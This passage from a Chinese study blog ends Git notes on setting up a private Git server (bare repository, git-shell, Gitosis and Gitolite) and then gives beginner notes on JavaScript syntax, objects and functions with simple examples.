<h3 id="搭建Git服务器"><a href="#搭建Git服务器" class="headerlink" title="搭建Git服务器"></a>搭建Git服务器</h3><p>在远程仓库一节中，我们讲了远程仓库实际上和本地仓库没啥不同，纯粹为了7x24小时开机并交换大家的修改。</p>
<p>GitHub就是一个免费托管开源代码的远程仓库。但是对于某些视源代码如生命的商业公司来说，既不想公开源代码，又舍不得给GitHub交保护费，那就只能自己搭建一台Git服务器作为私有仓库使用。</p>
<p>搭建Git服务器需要准备一台运行Linux的机器，强烈推荐用Ubuntu或Debian，这样，通过几条简单的<code>apt</code>命令就可以完成安装。</p>
<p>假设你已经有<code>sudo</code>权限的用户账号，下面，正式开始安装。</p>
<p>第一步，安装<code>git</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install git</span><br></pre></td></tr></table></figure>

<p>第二步，创建一个<code>git</code>用户，用来运行<code>git</code>服务：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo adduser git</span><br></pre></td></tr></table></figure>

<p>第三步，创建证书登录：</p>
<p>收集所有需要登录的用户的公钥，就是他们自己的<code>id_rsa.pub</code>文件，把所有公钥导入到<code>/home/git/.ssh/authorized_keys</code>文件里，一行一个。</p>
<p>第四步，初始化Git仓库：</p>
<p>先选定一个目录作为Git仓库，假定是<code>/srv/sample.git</code>，在<code>/srv</code>目录下输入命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo git init --bare sample.git</span><br></pre></td></tr></table></figure>

<p>Git就会创建一个裸仓库，裸仓库没有工作区，因为服务器上的Git仓库纯粹是为了共享，所以不让用户直接登录到服务器上去改工作区，并且服务器上的Git仓库通常都以<code>.git</code>结尾。然后，把owner改为<code>git</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo chown -R git:git sample.git</span><br></pre></td></tr></table></figure>

<p>第五步，禁用shell登录：</p>
<p>出于安全考虑，第二步创建的git用户不允许登录shell，这可以通过编辑<code>/etc/passwd</code>文件完成。找到类似下面的一行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git:x:1001:1001:,,,:&#x2F;home&#x2F;git:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>改为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git:x:1001:1001:,,,:&#x2F;home&#x2F;git:&#x2F;usr&#x2F;bin&#x2F;git-shell</span><br></pre></td></tr></table></figure>

<p>这样，<code>git</code>用户可以正常通过ssh使用git，但无法登录shell，因为我们为<code>git</code>用户指定的<code>git-shell</code>每次一登录就自动退出。</p>
<p>第六步，克隆远程仓库：</p>
<p>现在，可以通过<code>git clone</code>命令克隆远程仓库了，在各自的电脑上运行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git clone git@server:&#x2F;srv&#x2F;sample.git</span><br><span class="line">Cloning into &#39;sample&#39;...</span><br><span class="line">warning: You appear to have cloned an empty repository.</span><br></pre></td></tr></table></figure>

<p>剩下的推送就简单了。</p>
<p>管理公钥</p>
<p>如果团队很小，把每个人的公钥收集起来放到服务器的<code>/home/git/.ssh/authorized_keys</code>文件里就是可行的。如果团队有几百号人，就没法这么玩了，这时，可以用<a href="https://github.com/res0nat0r/gitosis" target="_blank" rel="noopener">Gitosis</a>来管理公钥。</p>
<p>管理权限</p>
<p>有很多不但视源代码如生命，而且视员工为窃贼的公司，会在版本控制系统里设置一套完善的权限控制，每个人是否有读写权限会精确到每个分支甚至每个目录下。因为Git是为Linux源代码托管而开发的，所以Git也继承了开源社区的精神，不支持权限控制。不过，因为Git支持钩子（hook），所以，可以在服务器端编写一系列脚本来控制提交等操作，达到权限控制的目的。<a href="https://github.com/sitaramc/gitolite" target="_blank" rel="noopener">Gitolite</a>就是这个工具。</p>
<p>小结：</p>
<p>搭建Git服务器非常简单，通常10分钟即可完成；</p>
<p>要方便管理公钥，用<a href="https://github.com/res0nat0r/gitosis" target="_blank" rel="noopener">Gitosis</a>；</p>
<p>要像SVN那样变态地控制权限，用<a href="https://github.com/sitaramc/gitolite" target="_blank" rel="noopener">Gitolite</a>。</p>
<h2 id="使用SourceTree"><a href="#使用SourceTree" class="headerlink" title="使用SourceTree"></a>使用SourceTree</h2><p><a href="https://www.liaoxuefeng.com/wiki/896043488029600/1317161920364578" target="_blank" rel="noopener">https://www.liaoxuefeng.com/wiki/896043488029600/1317161920364578</a></p>
<p>小结：</p>
<p>使用SourceTree可以以图形界面操作Git，省去了敲命令的过程，对于常用的提交、分支、推送等操作来说非常方便。</p>
<p>SourceTree使用Git命令执行操作，出错时，仍然需要阅读Git命令返回的错误信息。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>看了廖雪峰前辈的教程，学到了许多Git的基本操作，以后使用Github应该会更加顺手了。</p>
<p>另外，自己有点懒，这个笔记大部分还是从前辈那copy来的，尤其是从分支管理那一节开始就没怎么实操了，只是看了内容。</p>
<p>我发现大佬每一节的总结非常有用，把每一节的内容概括的非常简短，感觉可以直接看总结快速上手。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.liaoxuefeng.com/wiki/896043488029600" target="_blank" rel="noopener">https://www.liaoxuefeng.com/wiki/896043488029600</a></p>
<p><a href="https://www.cnblogs.com/guoyaohua/p/8021861.html" target="_blank" rel="noopener">https://www.cnblogs.com/guoyaohua/p/8021861.html</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
  </entry>
  <entry>
    <title>JavaScript学习笔记</title>
    <url>/2021/04/12/JavaScript/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>JavaScript 是互联网上最流行的脚本语言，这门语言可用于 HTML 和 web，更可广泛用于服务器、PC、笔记本电脑、平板电脑和智能手机等设备。<a id="more"></a></p>
<p>JavaScript 是一种轻量级的编程语言。</p>
<p>JavaScript 是可插入 HTML 页面的编程代码。</p>
<h2 id="Javascript用法"><a href="#Javascript用法" class="headerlink" title="Javascript用法"></a>Javascript用法</h2><h3 id="lt-script-gt-标签"><a href="#lt-script-gt-标签" class="headerlink" title="&lt;script&gt;标签"></a><code>&lt;script&gt;</code>标签</h3><p>HTML 中的脚本必须位于<code>&lt;script&gt;</code>与<code>&lt;/script&gt;</code>标签之间。</p>
<p>脚本可位于 HTML 的 <code>&lt;body&gt;</code> 或 <code>&lt;head&gt;</code> 部分中，或者同时存在于两个部分中。</p>
<h3 id="在-lt-head-gt-或者-lt-body-gt-的Javascript"><a href="#在-lt-head-gt-或者-lt-body-gt-的Javascript" class="headerlink" title="在&lt;head&gt;或者&lt;body&gt;的Javascript"></a>在<code>&lt;head&gt;</code>或者<code>&lt;body&gt;</code>的Javascript</h3><p>脚本可位于 HTML 的 <code>&lt;body&gt;</code>或 <code>&lt;head&gt;</code> 部分中，或者同时存在于两个部分中。</p>
<p>通常的做法是把函数放入 <code>&lt;head&gt;</code> 部分中，或者放在页面底部。这样就可以把它们安置到同一处位置，不会干扰页面的内容。</p>
<p>但是放在<code>&lt;head&gt;</code>里可能会有问题，因为在页面DOM元素加载完之前，js脚本就以及执行完了，如果js脚本里有操作DOM元素的话，可能就没有效果了，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;cn&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;script标签的位置&lt;&#x2F;title&gt;</span><br><span class="line">	&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">		function btnClick() &#123;</span><br><span class="line">				alert(&#39;helloWorld!&#39;);</span><br><span class="line">			&#125;;</span><br><span class="line">		document.getElementById(&quot;btn&quot;).onclick &#x3D; function() &#123;</span><br><span class="line">				alert(&#39;hello777!&#39;);</span><br><span class="line">			&#125;;</span><br><span class="line">	&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;input type&#x3D;&quot;button&quot; id&#x3D;&quot;btn&quot;  value&#x3D;&quot;点击我&quot; onclick&#x3D;&quot;btnClick();&quot;&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>所以放在<code>&lt;body&gt;</code>底部比较好，因为这个位置的js会等页面DOM元素加载完才执行，并且不会阻塞渲染。</p>
<p>如果只想写在<code>&lt;head&gt;</code>里又想让它正常运行，可以把代码写进<code>onload</code>事件里(等页面加载好的一个事件)，使其成为内嵌函数，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;cn&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;script标签的位置&lt;&#x2F;title&gt;</span><br><span class="line">	&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">		function btnClick() &#123;</span><br><span class="line">				alert(&#39;helloWorld!&#39;);</span><br><span class="line">			&#125;;</span><br><span class="line">		onload &#x3D; function() &#123;</span><br><span class="line">				document.getElementById(&quot;btn&quot;).onclick &#x3D; function() &#123;</span><br><span class="line">				alert(&#39;hello777!&#39;);</span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;</span><br><span class="line">	&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;input type&#x3D;&quot;button&quot; id&#x3D;&quot;btn&quot;  value&#x3D;&quot;点击我&quot; onclick&#x3D;&quot;btnClick();&quot;&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<h3 id="函数和事件"><a href="#函数和事件" class="headerlink" title="函数和事件"></a>函数和事件</h3><p>通常，我们需要在某个事件发生时执行代码，比如当用户点击按钮时。</p>
<p>如果我们把 JavaScript 代码放入函数中，就可以在事件发生时调用该函数。</p>
<h3 id="外部的Javascript"><a href="#外部的Javascript" class="headerlink" title="外部的Javascript"></a>外部的Javascript</h3><p>也可以把脚本保存到外部文件中。外部文件通常包含被多个网页使用的代码。</p>
<p>外部 JavaScript 文件的文件扩展名是 .js。</p>
<p>如需使用外部文件，请在<code>&lt;script&gt;</code> 标签的 “src” 属性中设置该 .js 文件</p>
<h2 id="Chrome浏览器执行Javascript"><a href="#Chrome浏览器执行Javascript" class="headerlink" title="Chrome浏览器执行Javascript"></a>Chrome浏览器执行Javascript</h2><p>1、Console控制台调试javascript代码</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/20210409170942.png" alt="image-20210409170935845"></p>
<p>2、Chrome snippets小脚本</p>
<p>可以在sources面板的snippets选项里新建脚本文件并执行</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210409171248011.png" alt="image-20210409171248011"></p>
<h2 id="Javascript输出"><a href="#Javascript输出" class="headerlink" title="Javascript输出"></a>Javascript输出</h2><p>Javascript没有任何打印或者输出的函数。但是可以通过不同的方式来输出数据：</p>
<p>1、window.alert()弹出警告框。alert() 函数在 JavaScript 中并不常用，但它对于代码测试非常方便。</p>
<p>2、document.write()方法将内容写到HTML文档中。直接写入 HTML 输出流，只能在 HTML 输出中使用 document.write。如果在文档加载后使用该方法，会覆盖整个文档。</p>
<p>3、innerHTML写入到HTML元素。</p>
<p>4、console.log()写入到浏览器的控制台。</p>
<p>通常用法是用javascript写一个函数，通过操作DOM元素来修改内容<code>document.getElementById(&quot;id&quot;).innerHTML=xxx</code>，最后在页面写一个按钮，通过事件(onclick等等)来触发这个函数</p>
<h2 id="Javascript语法"><a href="#Javascript语法" class="headerlink" title="Javascript语法"></a>Javascript语法</h2><h3 id="字面量"><a href="#字面量" class="headerlink" title="字面量"></a>字面量</h3><p>固定值称为字面量，如3.14。</p>
<p>数字字面量可以是整数或者是小数，或者是科学计数(e)。</p>
<p>字符串字面量用单引号或双引号包围。</p>
<p>表达式字面量用于计算。</p>
<p>数组字面量定义一个数组。</p>
<p>对象字面量定义一个对象。</p>
<p>函数字面量定义一个函数。</p>
<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>Javascript用var来声明(创建)变量，在 2015 后的 JavaScript 版本 (ES6) 允许我们使用 const 关键字来定义一个常量，使用 let 关键字定义的限定范围内作用域的变量。</p>
<p>变量必须以字母开头</p>
<p>变量名称对大小写敏感（y 和 Y 是不同的变量）</p>
<h3 id="语句"><a href="#语句" class="headerlink" title="语句"></a>语句</h3><p>javascript语句用分号分隔。</p>
<p>通常我们在每条可执行的语句结尾添加分号。</p>
<p>使用分号的另一用处是在一行中编写多条语句。</p>
<p>在 JavaScript 中，用分号来结束语句是可选的。</p>
<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>单行注释以双斜杠<code>//</code>开头</p>
<p>多行注释以 <strong>/*</strong> 开始，以 <strong>*/</strong> 结尾。</p>
<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>JavaScript 有多种数据类型：数字，字符串，数组，对象等等：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var length &#x3D; 16;                                  &#x2F;&#x2F; Number 通过数字字面量赋值</span><br><span class="line">var points &#x3D; x * 10;                              &#x2F;&#x2F; Number 通过表达式字面量赋值</span><br><span class="line">var lastName &#x3D; &quot;Johnson&quot;;                         &#x2F;&#x2F; String 通过字符串字面量赋值</span><br><span class="line">var cars &#x3D; [&quot;Saab&quot;, &quot;Volvo&quot;, &quot;BMW&quot;];              &#x2F;&#x2F; Array  通过数组字面量赋值</span><br><span class="line">var person &#x3D; &#123;firstName:&quot;John&quot;, lastName:&quot;Doe&quot;&#125;;  &#x2F;&#x2F; Object 通过对象字面量赋值</span><br></pre></td></tr></table></figure>

<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>用<code>function</code>来定义函数</p>
<h3 id="字母大小写"><a href="#字母大小写" class="headerlink" title="字母大小写"></a>字母大小写</h3><p>JavaScript 对大小写是敏感的。 JavaScript 语句和 JavaScript 变量都对大小写敏感。</p>
<p>当编写 JavaScript 语句时，请留意是否关闭大小写切换键。</p>
<p>函数 <strong>getElementById</strong> 与 <strong>getElementbyID</strong> 是不同的。</p>
<p>同样，变量 <strong>myVariable</strong> 与 <strong>MyVariable</strong> 也是不同的。</p>
<h3 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h3><p>JavaScript 使用 Unicode 字符集。</p>
<p>Unicode 覆盖了所有的字符，包含标点等字符。</p>
<h3 id="命名规则"><a href="#命名规则" class="headerlink" title="命名规则"></a>命名规则</h3><p>JavaScript 中，常见的是驼峰法的命名规则，如 lastName (而不是lastname)。</p>
<blockquote>
<p><strong>驼峰命名法</strong></p>
<p>骆驼式命名法就是当变量名或函式名是由一个或多个单字连结在一起，而构成的唯一识别字时<strong>，第一个单词以小写字母开始；第二个单词的首字母大写或每一个单词的首字母都采用大写字母，</strong>例如：myFirstName、myLastName，这样的变量名看上去就像骆驼峰一样此起彼伏，故得名。</p>
</blockquote>
<h2 id="Javascript语句"><a href="#Javascript语句" class="headerlink" title="Javascript语句"></a>Javascript语句</h2><h3 id="语句标识符"><a href="#语句标识符" class="headerlink" title="语句标识符"></a>语句标识符</h3><p>JavaScript 语句通常以一个 <strong>语句标识符</strong> 为开始，并执行该语句。</p>
<p>语句标识符是保留关键字不能作为变量名使用。</p>
<p>下表列出了 JavaScript 语句标识符 (关键字) ：</p>
<table>
<thead>
<tr>
<th align="left">语句</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">break</td>
<td align="left">用于跳出循环。</td>
</tr>
<tr>
<td align="left">catch</td>
<td align="left">语句块，在 try 语句块执行出错时执行 catch 语句块。</td>
</tr>
<tr>
<td align="left">continue</td>
<td align="left">跳过循环中的一个迭代。</td>
</tr>
<tr>
<td align="left">do … while</td>
<td align="left">执行一个语句块，在条件语句为 true 时继续执行该语句块。</td>
</tr>
<tr>
<td align="left">for</td>
<td align="left">在条件语句为 true 时，可以将代码块执行指定的次数。</td>
</tr>
<tr>
<td align="left">for … in</td>
<td align="left">用于遍历数组或者对象的属性（对数组或者对象的属性进行循环操作）。</td>
</tr>
<tr>
<td align="left">function</td>
<td align="left">定义一个函数</td>
</tr>
<tr>
<td align="left">if … else</td>
<td align="left">用于基于不同的条件来执行不同的动作。</td>
</tr>
<tr>
<td align="left">return</td>
<td align="left">退出函数</td>
</tr>
<tr>
<td align="left">switch</td>
<td align="left">用于基于不同的条件来执行不同的动作。</td>
</tr>
<tr>
<td align="left">throw</td>
<td align="left">抛出（生成）错误 。</td>
</tr>
<tr>
<td align="left">try</td>
<td align="left">实现错误处理，与 catch 一同使用。</td>
</tr>
<tr>
<td align="left">var</td>
<td align="left">声明一个变量。</td>
</tr>
<tr>
<td align="left">while</td>
<td align="left">当条件语句为 true 时，执行语句块。</td>
</tr>
</tbody></table>
<h3 id="代码行折行"><a href="#代码行折行" class="headerlink" title="代码行折行"></a>代码行折行</h3><p>您可以在文本字符串中使用反斜杠对代码行进行换行。下面的例子会正确地显示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.write(&quot;你好 \</span><br><span class="line">世界!&quot;);</span><br></pre></td></tr></table></figure>

<p>不过，不能像这样折行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.write \ </span><br><span class="line">(&quot;你好世界!&quot;);</span><br></pre></td></tr></table></figure>

<p><strong>知识点：</strong>JavaScript 是脚本语言，浏览器会在读取代码时，逐行地执行脚本代码。而对于传统编程来说，会在执行前对所有代码进行编译。</p>
<h2 id="Javascript数据类型"><a href="#Javascript数据类型" class="headerlink" title="Javascript数据类型"></a>Javascript数据类型</h2><p><strong>值类型(基本类型)</strong>：字符串（String）、数字(Number)、布尔(Boolean)、对空（Null）、未定义（Undefined）、Symbol。</p>
<p><strong>引用数据类型</strong>：对象(Object)、数组(Array)、函数(Function)。</p>
<blockquote>
<p><strong>注：</strong>Symbol 是 ES6 引入了一种新的原始数据类型，表示独一无二的值。</p>
</blockquote>
<h3 id="Javascript拥有动态类型"><a href="#Javascript拥有动态类型" class="headerlink" title="Javascript拥有动态类型"></a>Javascript拥有动态类型</h3><p>JavaScript拥有动态类型，这意味着相同的变量可用作不同的类型：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var x;               &#x2F;&#x2F; x 为 undefined</span><br><span class="line">var x &#x3D; 5;           &#x2F;&#x2F; 现在 x 为数字</span><br><span class="line">var x &#x3D; &quot;John&quot;;      &#x2F;&#x2F; 现在 x 为字符串</span><br></pre></td></tr></table></figure>

<h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>下面的代码创建名为 cars 的数组：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var cars&#x3D;new Array();</span><br><span class="line">cars[0]&#x3D;&quot;Saab&quot;;</span><br><span class="line">cars[1]&#x3D;&quot;Volvo&quot;;</span><br><span class="line">cars[2]&#x3D;&quot;BMW&quot;;</span><br></pre></td></tr></table></figure>

<p>或者 (condensed array):</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var cars&#x3D;new Array(&quot;Saab&quot;,&quot;Volvo&quot;,&quot;BMW&quot;);</span><br></pre></td></tr></table></figure>

<p>或者 (literal array):</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var cars&#x3D;[&quot;Saab&quot;,&quot;Volvo&quot;,&quot;BMW&quot;];</span><br></pre></td></tr></table></figure>

<h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><p>对象由花括号分隔。在括号内部，对象的属性以名称和值对的形式 (name : value) 来定义。属性由逗号分隔：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var person&#x3D;&#123;firstname:&quot;John&quot;, lastname:&quot;Doe&quot;, id:5566&#125;;</span><br></pre></td></tr></table></figure>

<p>上面例子中的对象 (person) 有三个属性：firstname、lastname 以及 id。</p>
<p>空格和折行无关紧要。声明可横跨多行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var person&#x3D;&#123;</span><br><span class="line">firstname : &quot;John&quot;,</span><br><span class="line">lastname  : &quot;Doe&quot;,</span><br><span class="line">id        :  5566</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>对象属性有两种寻址方式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;person.lastname;</span><br><span class="line">name&#x3D;person[&quot;lastname&quot;];</span><br></pre></td></tr></table></figure>

<h3 id="Undefined和Null"><a href="#Undefined和Null" class="headerlink" title="Undefined和Null"></a>Undefined和Null</h3><p>Undefined 这个值表示变量不含有值。</p>
<p>可以通过将变量的值设置为 null 来清空变量。</p>
<h3 id="声明变量类型"><a href="#声明变量类型" class="headerlink" title="声明变量类型"></a>声明变量类型</h3><p>用关键词”new”来声明其类型：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var carname&#x3D;new String;</span><br><span class="line">var x&#x3D;      new Number;</span><br><span class="line">var y&#x3D;      new Boolean;</span><br><span class="line">var cars&#x3D;   new Array;</span><br><span class="line">var person&#x3D; new Object;</span><br></pre></td></tr></table></figure>

<p> JavaScript 变量均为对象。当您声明一个变量时，就创建了一个新的对象。</p>
<h2 id="JavaScript对象"><a href="#JavaScript对象" class="headerlink" title="JavaScript对象"></a>JavaScript对象</h2><p>JavaScript 对象是拥有属性和方法的数据。(感觉和Java对象有点像)</p>
<p>在 JavaScript中，几乎所有的事物都是对象。</p>
<p>对象也是一个变量，但对象可以包含多个值（多个变量），每个值以 <strong>name:value</strong> 对呈现。</p>
<p>可以说 “JavaScript 对象是变量的容器”。</p>
<p>但是，我们通常认为 “JavaScript 对象是键值对的容器”。</p>
<p>键值对通常写法为 <strong>name : value</strong> (键与值以冒号分割)。</p>
<p>键值对在 JavaScript 对象通常称为 <strong>对象属性</strong>。</p>
<p> JavaScript 对象是属性变量的容器。</p>
<p> JavaScript 对象是属性和方法的容器。</p>
<h3 id="访问对象属性"><a href="#访问对象属性" class="headerlink" title="访问对象属性"></a>访问对象属性</h3><p>可以通过两种方式访问对象属性:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;person.lastname;</span><br><span class="line">name&#x3D;person[&quot;lastname&quot;];</span><br></pre></td></tr></table></figure>

<h3 id="对象方法"><a href="#对象方法" class="headerlink" title="对象方法"></a>对象方法</h3><p>对象的方法定义了一个函数，并作为对象的属性存储。</p>
<p>对象方法通过添加 () 调用 (作为一个函数)。</p>
<p>该实例访问了 person 对象的 fullName() 方法:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;p id&#x3D;&quot;demo&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var person &#x3D; &#123;</span><br><span class="line">    firstName: &quot;John&quot;,</span><br><span class="line">    lastName : &quot;Doe&quot;,</span><br><span class="line">    id : 5566,</span><br><span class="line">    fullName : function() </span><br><span class="line">	&#123;</span><br><span class="line">       return this.firstName + &quot; &quot; + this.lastName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">document.getElementById(&quot;demo&quot;).innerHTML &#x3D; person.fullName();</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>如果你要访问 person 对象的 fullName 属性，它将作为一个定义函数的字符串返回：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;p id&#x3D;&quot;demo1&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p id&#x3D;&quot;demo2&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var person &#x3D; &#123;</span><br><span class="line">    firstName: &quot;John&quot;,</span><br><span class="line">    lastName : &quot;Doe&quot;,</span><br><span class="line">    id : 5566,</span><br><span class="line">    fullName : function() </span><br><span class="line">	&#123;</span><br><span class="line">       return this.firstName + &quot; &quot; + this.lastName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">document.getElementById(&quot;demo1&quot;).innerHTML &#x3D; &quot;不加括号输出函数表达式：&quot;  + person.fullName;</span><br><span class="line">document.getElementById(&quot;demo2&quot;).innerHTML &#x3D; &quot;加括号输出函数执行结果：&quot;  +  person.fullName();</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="访问对象方法"><a href="#访问对象方法" class="headerlink" title="访问对象方法"></a>访问对象方法</h3><p>可以使用以下语法创建对象方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">methodName : function() &#123;</span><br><span class="line">    &#x2F;&#x2F; 代码 </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以使用以下语法访问对象方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">objectName.methodName()</span><br></pre></td></tr></table></figure>

<p>通常 fullName() 是作为 person 对象的一个方法， fullName 是作为一个属性。</p>
<h2 id="JavaScript函数"><a href="#JavaScript函数" class="headerlink" title="JavaScript函数"></a>JavaScript函数</h2><p>函数是由事件驱动的或者当它被调用时执行的可重复使用的代码块。</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>函数就是包裹在花括号中的代码块，前面使用了关键词 function：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function functionname()</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; 执行代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当调用该函数时，会执行函数内的代码。</p>
<p>可以在某事件发生时直接调用函数（比如当用户点击按钮时），并且可由 JavaScript 在任何位置进行调用。 JavaScript 对大小写敏感。关键词 function 必须是小写的，并且必须以与函数名称相同的大小写来调用函数。</p>
<h3 id="调用带参数的函数"><a href="#调用带参数的函数" class="headerlink" title="调用带参数的函数"></a>调用带参数的函数</h3><p>在调用函数时，您可以向其传递值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function myFunction(var1,var2)</span><br><span class="line">&#123;</span><br><span class="line">	&#x2F;&#x2F; 代码</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">myFunction(argument1,argument2)</span><br></pre></td></tr></table></figure>

<h3 id="带返回值的函数"><a href="#带返回值的函数" class="headerlink" title="带返回值的函数"></a>带返回值的函数</h3><p>有时，我们会希望函数将值返回调用它的地方。</p>
<p>通过使用 return 语句就可以实现。</p>
<p>在使用 return 语句时，函数会停止执行，并返回指定的值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function myFunction()</span><br><span class="line">&#123;</span><br><span class="line">    var x&#x3D;5;</span><br><span class="line">    return x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在您仅仅希望退出函数时 ，也可使用 return 语句。返回值是可选的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function myFunction(a,b)</span><br><span class="line">&#123;</span><br><span class="line">    if (a&gt;b)</span><br><span class="line">    &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    x&#x3D;a+b</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;如果 a 大于 b，则上面的代码将退出函数，并不会计算 a 和 b 的总和。</span><br></pre></td></tr></table></figure>

<h3 id="局部javascript变量"><a href="#局部javascript变量" class="headerlink" title="局部javascript变量"></a>局部javascript变量</h3><p>在 JavaScript 函数内部声明的变量（使用 var）是<em>局部</em>变量，所以只能在函数内部访问它。（该变量的作用域是局部的）。</p>
<p>您可以在不同的函数中使用名称相同的局部变量，因为只有声明过该变量的函数才能识别出该变量。</p>
<p>只要函数运行完毕，本地变量就会被删除。</p>
<h3 id="全局javascript变量"><a href="#全局javascript变量" class="headerlink" title="全局javascript变量"></a>全局javascript变量</h3><p>在函数外声明的变量是<em>全局</em>变量，网页上的所有脚本和函数都能访问它。</p>
<h3 id="JavaScript变量的生命周期"><a href="#JavaScript变量的生命周期" class="headerlink" title="JavaScript变量的生命周期"></a>JavaScript变量的生命周期</h3><p>JavaScript 变量生命周期在它声明时初始化。</p>
<p>局部变量在函数执行完毕后销毁。</p>
<p>全局变量在页面关闭后销毁。</p>
<h3 id="向未声明的JavaScript变量赋值"><a href="#向未声明的JavaScript变量赋值" class="headerlink" title="向未声明的JavaScript变量赋值"></a>向未声明的JavaScript变量赋值</h3><p>如果您把值赋给尚未声明的变量，该变量将被自动作为 window 的一个属性。</p>
<p>非严格模式下给未声明变量赋值创建的全局变量，是全局对象的可配置属性，可以删除。</p>
